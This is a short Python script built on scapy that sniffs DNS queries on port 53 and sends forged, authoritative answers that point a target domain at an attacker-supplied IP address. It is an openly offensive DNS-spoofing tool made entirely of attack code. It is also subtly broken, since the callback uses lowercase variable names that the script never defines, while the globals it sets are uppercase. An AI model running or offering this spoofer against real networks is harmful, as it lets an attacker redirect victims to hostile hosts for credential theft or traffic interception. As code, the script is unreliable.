from scapy.all import *

TARGET_DOMAIN = ""
ATTACKER_IP = ""

def dns_response(packet):
    # Check if packet is DNS query and not response
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        qname = packet[DNSQR].qname.decode('utf-8')

        # Check if domain matches target
        if target_domain in qname:
            print(f"[+] Spoofing DNS response for {qname}")

            # Create spoofed DNS response
            spoofed_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                          UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) / \
                          DNS(id=packet[DNS].id,          
                              qr=1,                       
                              aa=1,                       
                              rd=1,                       
                              qd=packet[DNS].qd,          
                              an=DNSRR(rrname=qname,     
                                       ttl=10, 
                                       rdata=attacker_ip))    
            
            send(spoofed_packet, verbose=False)

def start_dns_spoof(target_domain, attacker_ip):
    global TARGET_DOMAIN, ATTACKER_IP
    TARGET_DOMAIN = target_domain
    ATTACKER_IP = attacker_ip

    print(f"[+] Starting DNS spoofing for domain: {target_domain}")
    sniff(filter="udp port 53", prn=dns_response, store=0)

